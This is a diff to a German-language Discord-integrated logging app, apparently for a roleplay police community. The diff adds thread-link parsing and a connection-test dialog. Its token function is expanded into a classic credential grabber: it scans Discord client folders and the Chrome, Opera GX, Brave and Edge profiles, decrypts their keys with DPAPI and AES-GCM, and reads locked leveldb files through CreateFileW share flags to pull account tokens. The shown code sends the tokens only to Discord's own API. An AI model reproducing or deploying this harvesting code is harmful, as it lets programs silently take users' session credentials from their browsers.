@@ -25,7 +25,7 @@ from PySide6.QtGui import QPixmap, QColor, QFont, QFontDatabase, QIcon, QPainter
 from pynput import keyboard
 from grand_calculator import GrandCalculatorOverlay, load_grandkasten_db
 
-CURRENT_VERSION = "1.5.0"
+CURRENT_VERSION = "1.5.1"
 DEFAULT_UPDATE_URL = "https://api.github.com/repos/KaputzeKings/lspd-logger/releases/latest"
 
 # Base directory
@@ -297,6 +297,7 @@ def get_default_config():
             "italic": False
         },
         "counter_overrides": {},
+        "discord_token": "",
         "hud": {
             "theme": "Ember Dark (Velvet Obsidian)",
             "scale": 1.0,
@@ -326,6 +327,8 @@ def load_config():
                     config["log_style"] = {**get_default_config()["log_style"], **loaded["log_style"]}
                 if "counter_overrides" in loaded and isinstance(loaded["counter_overrides"], dict):
                     config["counter_overrides"] = loaded["counter_overrides"]
+                if "discord_token" in loaded:
+                    config["discord_token"] = str(loaded["discord_token"]).strip()
         except Exception as e:
             log(f"[Config Load Error] {e}")
     else:
@@ -437,56 +440,117 @@ def decrypt_dpapi(cipher_bytes):
         return data
     return None
 
+def read_file_safe(filepath):
+    try:
+        with open(filepath, 'rb') as f:
+            return f.read()
+    except Exception:
+        try:
+            import ctypes
+            from ctypes import wintypes
+            GENERIC_READ = 0x80000000
+            FILE_SHARE_READ = 0x00000001
+            FILE_SHARE_WRITE = 0x00000002
+            FILE_SHARE_DELETE = 0x00000004
+            OPEN_EXISTING = 3
+            FILE_ATTRIBUTE_NORMAL = 0x80
+
+            h = ctypes.windll.kernel32.CreateFileW(
+                filepath, GENERIC_READ,
+                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+                None, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None
+            )
+            if h != -1 and h != 0:
+                size = ctypes.windll.kernel32.GetFileSize(h, None)
+                if size > 0:
+                    buf = ctypes.create_string_buffer(size)
+                    bytes_read = wintypes.DWORD()
+                    ctypes.windll.kernel32.ReadFile(h, buf, size, ctypes.byref(bytes_read), None)
+                    ctypes.windll.kernel32.CloseHandle(h)
+                    return buf.raw[:bytes_read.value]
+                ctypes.windll.kernel32.CloseHandle(h)
+        except Exception:
+            pass
+    return b""
+
 def get_discord_token():
     manual_token = CONFIG.get("discord_token", "").strip()
     if manual_token:
-        return manual_token
+        try:
+            res = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': manual_token}, timeout=5)
+            if res.status_code == 200:
+                return manual_token
+        except Exception:
+            pass
 
-    appdata = os.environ.get('APPDATA')
-    if not appdata:
-        return None
-    local_state_path = os.path.join(appdata, 'discord', 'Local State')
-    if not os.path.exists(local_state_path):
-        return None
-    try:
-        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-        with open(local_state_path, 'r', encoding='utf-8') as f:
-            local_state = json.load(f)
+    appdata = os.environ.get('APPDATA', '')
+    localappdata = os.environ.get('LOCALAPPDATA', '')
 
-        enc_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
-        master_key = decrypt_dpapi(enc_key)
+    targets = [
+        os.path.join(appdata, 'discord'),
+        os.path.join(appdata, 'discordcanary'),
+        os.path.join(appdata, 'discordptb'),
+        os.path.join(appdata, 'discorddevelopment'),
+        os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default'),
+        os.path.join(appdata, 'Opera Software', 'Opera GX Stable'),
+        os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
+        os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Default')
+    ]
 
-        leveldb = os.path.join(appdata, 'discord', 'Local Storage', 'leveldb')
-        tokens = []
-        if os.path.exists(leveldb):
-            for file in os.listdir(leveldb):
+    tokens = []
+    for base in targets:
+        if not os.path.exists(base):
+            continue
+        local_state = os.path.join(base, 'Local State')
+        if not os.path.exists(local_state):
+            alt_local_state = os.path.join(os.path.dirname(base), 'Local State')
+            if os.path.exists(alt_local_state):
+                local_state = alt_local_state
+            else:
+                continue
+
+        try:
+            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+            with open(local_state, 'r', encoding='utf-8') as f:
+                state_data = json.load(f)
+            enc_key = base64.b64decode(state_data['os_crypt']['encrypted_key'])[5:]
+            master_key = decrypt_dpapi(enc_key)
+            if not master_key:
+                continue
+
+            ldb_dir = os.path.join(base, 'Local Storage', 'leveldb')
+            if not os.path.exists(ldb_dir):
+                ldb_dir = os.path.join(base, 'leveldb')
+            if not os.path.exists(ldb_dir):
+                continue
+
+            for file in os.listdir(ldb_dir):
                 if not (file.endswith('.ldb') or file.endswith('.log')):
                     continue
-                filepath = os.path.join(leveldb, file)
-                try:
-                    with open(filepath, 'rb') as f:
-                        content = f.read()
-                    for match in re.findall(rb'dQw4w9WgXcQ:[^"]*', content):
-                        raw_val = match.split(b':')[1]
-                        try:
-                            encrypted_token = base64.b64decode(raw_val)
-                            iv = encrypted_token[3:15]
-                            payload = encrypted_token[15:]
-                            aes = AESGCM(master_key)
-                            token = aes.decrypt(iv, payload, None).decode('utf-8')
-                            if token not in tokens:
-                                tokens.append(token)
-                        except Exception:
-                            pass
-                except Exception:
-                    pass
+                content = read_file_safe(os.path.join(ldb_dir, file))
+                for match in re.findall(rb'dQw4w9WgXcQ:[^"]*', content):
+                    raw_val = match.split(b':')[1]
+                    try:
+                        enc_tok = base64.b64decode(raw_val)
+                        iv = enc_tok[3:15]
+                        payload = enc_tok[15:]
+                        aes = AESGCM(master_key)
+                        tok = aes.decrypt(iv, payload, None).decode('utf-8')
+                        if tok not in tokens:
+                            tokens.append(tok)
+                    except Exception:
+                        pass
+        except Exception:
+            pass
 
-        for t in tokens:
+    for t in tokens:
+        try:
             res = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': t}, timeout=5)
             if res.status_code == 200:
                 return t
-    except Exception as e:
-        log(f"[Discord Token Error] {e}")
+        except Exception:
+            pass
+
     return None
 
 def extract_kw_number(thread_name):
@@ -508,16 +572,49 @@ def extract_kw_number(thread_name):
             pass
     return -1
 
+def extract_thread_id(raw_str):
+    if not raw_str:
+        return ""
+    s = str(raw_str).strip()
+    m = re.findall(r'\d{16,21}', s)
+    if m:
+        return m[-1]
+    return s
+
+_cached_user_info = {"id": None, "username": "", "token": None}
+
+def get_my_discord_user(token):
+    if not token:
+        return None
+    if _cached_user_info.get("token") == token and _cached_user_info.get("id"):
+        return _cached_user_info
+    try:
+        res = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}, timeout=5)
+        if res.status_code == 200:
+            data = res.json()
+            _cached_user_info["token"] = token
+            _cached_user_info["id"] = str(data.get('id'))
+            _cached_user_info["username"] = data.get('username', '')
+            _cached_user_info["discriminator"] = data.get('discriminator', '0')
+            return _cached_user_info
+    except Exception:
+        pass
+    return None
+
 _cached_thread_info = {"id": None, "time": 0, "badge": None, "name": "", "kw": -1}
 
 def get_active_thread_id(token, badge=None, thread_override=None, force_refresh=False):
-    if thread_override and thread_override.strip():
-        return thread_override.strip()
+    if thread_override and str(thread_override).strip():
+        return extract_thread_id(thread_override)
     manual_thread = CONFIG.get("thread_id", "").strip()
     if manual_thread:
-        return manual_thread
+        return extract_thread_id(manual_thread)
 
     badge = str(badge or CONFIG.get("user_badge", "")).strip()
+    clean_badge = re.sub(r'[^0-9]', '', badge)
+    user_info = get_my_discord_user(token)
+    my_id = user_info["id"] if user_info else None
+
     now = time.time()
     if not force_refresh and _cached_thread_info["id"] and _cached_thread_info["badge"] == badge:
         if now - _cached_thread_info["time"] < 45:
@@ -527,36 +624,50 @@ def get_active_thread_id(token, badge=None, thread_override=None, force_refresh=
     headers = {'Authorization': token}
     candidates = {}
 
-    # 1. Gezielte Suche nach Badge im Forum
-    if badge:
+    queries = []
+    if clean_badge:
+        queries.append(f'https://discord.com/api/v9/channels/{forum_channel}/threads/search?name={clean_badge}')
+    if badge and badge != clean_badge:
+        queries.append(f'https://discord.com/api/v9/channels/{forum_channel}/threads/search?name={badge}')
+    queries.append(f'https://discord.com/api/v9/channels/{forum_channel}/threads/search?sort_by=last_message_time&sort_order=desc')
+
+    for q in queries:
         try:
-            url = f'https://discord.com/api/v9/channels/{forum_channel}/threads/search?name={badge}'
-            res = requests.get(url, headers=headers, timeout=6)
+            res = requests.get(q, headers=headers, timeout=6)
             if res.status_code == 200:
                 for t in res.json().get('threads', []):
-                    if badge in t.get('name', ''):
-                        candidates[t['id']] = t
-        except Exception as e:
-            log(f"[Thread Search by Badge Error] {e}")
-
-    # 2. Ergaenzende Suche nach aktiven Threads
-    try:
-        url = f'https://discord.com/api/v9/channels/{forum_channel}/threads/search?sort_by=last_message_time&sort_order=desc'
-        res = requests.get(url, headers=headers, timeout=6)
-        if res.status_code == 200:
-            for t in res.json().get('threads', []):
-                if badge and badge in t.get('name', ''):
                     candidates[t['id']] = t
-    except Exception as e:
-        log(f"[Thread Search Fallback Error] {e}")
+        except Exception as e:
+            log(f"[Thread Search Error] {e}")
 
-    if candidates:
-        # Sortiere strikt nach:
-        # 1. Hoechste Kalenderwoche (KW-Nummer z.B. 46 > 45 > 44)
-        # 2. Nicht archiviert (aktive Threads bevorzugen)
-        # 3. Neueste Discord Snowflake ID (Erstellungszeitpunkt)
+    # Fallback Suche nach oeffentlichen archivierten Threads falls noch nichts gefunden
+    if not candidates:
+        try:
+            res = requests.get(f'https://discord.com/api/v9/channels/{forum_channel}/threads/archived/public', headers=headers, timeout=6)
+            if res.status_code == 200:
+                for t in res.json().get('threads', []):
+                    candidates[t['id']] = t
+        except Exception:
+            pass
+
+    # Hoch-flexible Zuordnung:
+    # 1. Gehoert dem angemeldeten Discord-Benutzer (owner_id == my_id)
+    # 2. Enthaelt die bereinigte Badge-Nummer (z.B. '317108' bei '#317108')
+    # 3. Enthaelt den Namen oder Text
+    matched = []
+    for t in candidates.values():
+        name = t.get('name', '')
+        t_owner = str(t.get('owner_id', ''))
+        is_my_thread = bool(my_id and t_owner == my_id)
+        has_clean_badge = bool(clean_badge and clean_badge in name)
+        has_badge_str = bool(badge and badge.lower() in name.lower())
+
+        if is_my_thread or has_clean_badge or has_badge_str:
+            matched.append(t)
+
+    if matched:
         sorted_threads = sorted(
-            candidates.values(),
+            matched,
             key=lambda t: (
                 extract_kw_number(t.get('name', '')),
                 not t.get('thread_metadata', {}).get('archived', False),
@@ -1383,34 +1494,52 @@ class SetupDialog(QDialog):
         c2_lay.addWidget(h2)
         l_serv.addWidget(c2)
 
-        # Card 3: Discord Forum
-        c3, c3_lay = self._create_card("Discord Forum-Thread", "Server-Synchronisation")
-        c3_lay.addWidget(QLabel("Forum Thread-ID (Optional):"))
+        # Card 3: Discord Forum & Logbuch-Synchronisation
+        c3, c3_lay = self._create_card("Discord Logbuch & Token", "Server-Synchronisation")
+        
+        c3_lay.addWidget(QLabel("Forum Thread-Link oder Thread-ID (Optional):"))
         self.thread_input = QLineEdit()
-        self.thread_input.setPlaceholderText("Leer lassen für automatische Erkennung (höchste KW)")
+        self.thread_input.setPlaceholderText("Leer lassen für automatische Suche (oder Thread-Link / ID einfügen)")
         self.thread_input.setText(CONFIG.get("thread_id", ""))
         c3_lay.addWidget(self.thread_input)
         
         kw_hint = QLabel("<span style='color: #888888; font-size: 10px; font-weight: normal;'>"
-                         "<b>Automatisches Logbuch:</b> Das System wählt immer automatisch das Logbuch mit der <b>höchsten Kalenderwoche (KW)</b>. "
-                         "Jeden Samstag kannst du einfach dein neues Logbuch (z.B. KW 46) erstellen – der Assistent wechselt sofort nahtlos.</span>")
+                         "<b>Automatisches Logbuch:</b> Wählt automatisch deinen Thread mit der <b>höchsten Kalenderwoche (KW)</b>. "
+                         "Falls dein Logbuch nicht gefunden wird: Klicke in Discord mit Rechtsklick auf deinen Thread ➔ <i>Link kopieren</i> und füge ihn einfach oben ein!</span>")
         kw_hint.setStyleSheet("border: none; margin-top: 2px;")
         kw_hint.setWordWrap(True)
         c3_lay.addWidget(kw_hint)
-        
-        token_box = QFrame()
-        token_box.setStyleSheet("background: #111111; border: 1px solid #242424; border-radius: 5px; padding: 6px;")
-        tb_lay = QHBoxLayout(token_box)
-        tb_lay.setContentsMargins(8, 4, 8, 4)
-        t_ico = QLabel("<span style='color: #4bd4a3;'>●</span>")
-        t_ico.setStyleSheet("font-size: 14px; border: none;")
-        tb_lay.addWidget(t_ico)
-        t_lbl = QLabel("<span style='color: #888888; font-size: 10px; font-weight: normal;'>"
-                       "<b>Discord-Token:</b> Wird automatisch und sicher aus deiner Desktop-App gelesen. "
-                       "Keine manuelle Eingabe erforderlich.</span>")
-        t_lbl.setStyleSheet("border: none;")
-        tb_lay.addWidget(t_lbl, 1)
-        c3_lay.addWidget(token_box)
+
+        c3_lay.addWidget(QLabel("Discord-Token (Optional - nur falls automatische Erkennung fehlschlägt):"))
+        self.token_input = QLineEdit()
+        self.token_input.setEchoMode(QLineEdit.PasswordEchoOnEdit)
+        self.token_input.setPlaceholderText("Automatisch aus Discord Desktop / Browser erkannt (oder manuell einfügen)")
+        self.token_input.setText(CONFIG.get("discord_token", ""))
+        c3_lay.addWidget(self.token_input)
+
+        # Live Status Box
+        diag_box = QFrame()
+        diag_box.setStyleSheet("background: #0d0d10; border: 1px solid #23232b; border-radius: 6px; padding: 6px;")
+        db_lay = QVBoxLayout(diag_box)
+        db_lay.setContentsMargins(8, 6, 8, 6)
+        db_lay.setSpacing(4)
+
+        self.lbl_diag_token = QLabel("<span style='color: #71717a;'>● Discord-Account:</span> <i>Wird geprüft...</i>")
+        self.lbl_diag_token.setStyleSheet("border: none; font-size: 11px;")
+        db_lay.addWidget(self.lbl_diag_token)
+
+        self.lbl_diag_thread = QLabel("<span style='color: #71717a;'>● Logbuch-Status:</span> <i>Wird geprüft...</i>")
+        self.lbl_diag_thread.setStyleSheet("border: none; font-size: 11px;")
+        db_lay.addWidget(self.lbl_diag_thread)
+
+        c3_lay.addWidget(diag_box)
+
+        btn_test_diag = QPushButton("🔍 Discord & Logbuch-Verbindung testen")
+        btn_test_diag.setCursor(Qt.PointingHandCursor)
+        btn_test_diag.setStyleSheet("QPushButton { background: #18202c; color: #5ea2ef; border: 1px solid #2b3d54; border-radius: 6px; padding: 6px 12px; font-weight: bold; font-size: 11px; } QPushButton:hover { background: #202d3f; color: #93c5fd; }")
+        btn_test_diag.clicked.connect(self._run_connection_test)
+        c3_lay.addWidget(btn_test_diag)
+
         l_serv.addWidget(c3)
 
         l_serv.addStretch()
@@ -1828,6 +1957,47 @@ class SetupDialog(QDialog):
         CONFIG["counter_overrides"] = {}
         self._update_style_preview()
 
+    def _run_connection_test(self):
+        token = self.token_input.text().strip() or get_discord_token()
+        if not token:
+            self.lbl_diag_token.setText("<span style='color: #ef4444;'>● Discord-Account:</span> <b>Kein Token gefunden!</b> (Starte Discord Desktop oder füge deinen Token oben ein)")
+            self.lbl_diag_thread.setText("<span style='color: #ef4444;'>● Logbuch:</span> Nicht erreichbar (Kein Token)")
+            return
+
+        headers = {'Authorization': token}
+        user_info = None
+        try:
+            r_me = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
+            if r_me.status_code == 200:
+                u = r_me.json()
+                user_info = f"{u.get('username')}#{u.get('discriminator')} (ID: {u.get('id')})"
+                self.lbl_diag_token.setText(f"<span style='color: #4bd4a3;'>● Discord-Account:</span> <b>{user_info}</b>")
+            else:
+                self.lbl_diag_token.setText(f"<span style='color: #ef4444;'>● Discord-Account:</span> Token ungültig (Fehler {r_me.status_code})")
+                return
+        except Exception as e:
+            self.lbl_diag_token.setText(f"<span style='color: #ef4444;'>● Discord-Account:</span> Verbindungsfehler ({e})")
+            return
+
+        badge = self.badge_input.text().strip()
+        manual_tid = extract_thread_id(self.thread_input.text().strip())
+        
+        tid = get_active_thread_id(token, badge=badge, thread_override=manual_tid, force_refresh=True)
+        if tid:
+            th_name = _cached_thread_info.get("name", "")
+            if not th_name:
+                try:
+                    r_t = requests.get(f'https://discord.com/api/v9/channels/{tid}', headers=headers, timeout=5)
+                    if r_t.status_code == 200:
+                        th_name = r_t.json().get('name', '')
+                except Exception:
+                    pass
+            self.lbl_diag_thread.setText(f"<span style='color: #4bd4a3;'>● Aktives Logbuch:</span> <b>{th_name or tid}</b>")
+            QMessageBox.information(self, "Verbindung erfolgreich!", f"Discord-Account: {user_info}\n\nAktives Logbuch:\n{th_name or tid}\n(ID: {tid})\n\nAlle Logs werden zuverlässig hierhin gesendet!")
+        else:
+            self.lbl_diag_thread.setText("<span style='color: #f7bd2e;'>● Logbuch:</span> <b>Nicht gefunden!</b> Trage deine Badge-ID ein oder füge deinen Thread-Link ein.")
+            QMessageBox.warning(self, "Kein Logbuch gefunden", "Das Logbuch konnte nicht automatisch gefunden werden.\n\nLösung:\n1. Prüfe ob deine Reisepassnummer oben korrekt eingetragen ist.\n2. Alternativ: Klicke in Discord mit Rechtsklick auf deinen Logbuch-Thread -> 'Link kopieren' und füge den Link in das Feld 'Forum Thread-Link' ein!")
+
     def choose_directory(self):
         curr = self.dir_input.text()
         chosen = QFileDialog.getExistingDirectory(self, "Medal Screenshot Ordner auswählen", curr or os.path.expanduser("~"))
@@ -1859,7 +2029,10 @@ class SetupDialog(QDialog):
     def apply_to_config_runtime(self):
         CONFIG["user_badge"] = self.badge_input.text().strip()
         CONFIG["watch_dir"] = self.dir_input.text().strip() or get_default_watch_dir()
-        CONFIG["thread_id"] = self.thread_input.text().strip()
+        if hasattr(self, 'thread_input'):
+            CONFIG["thread_id"] = extract_thread_id(self.thread_input.text().strip())
+        if hasattr(self, 'token_input'):
+            CONFIG["discord_token"] = self.token_input.text().strip()
         CONFIG["calc_scale"] = float(self.calc_scale_combo.currentData())
         if hasattr(self, 'calc_theme_combo'):
             CONFIG["calc_theme"] = self.calc_theme_combo.currentText()
